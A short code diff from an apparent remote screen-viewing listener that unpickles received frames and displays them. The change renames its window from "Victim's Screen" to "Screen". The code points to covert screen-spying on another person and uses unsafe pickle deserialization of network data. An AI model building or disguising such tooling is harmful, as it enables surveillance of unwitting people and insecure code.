@@ -39,7 +39,7 @@ def listener(ip, port):
         frame = pickle.loads(frame_data)
         frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
 
-        cv2.imshow("Victim's Screen", frame)
+        cv2.imshow("Screen", frame)
         if cv2.waitKey(1) & 0xFF == ord('q'):
             break
 
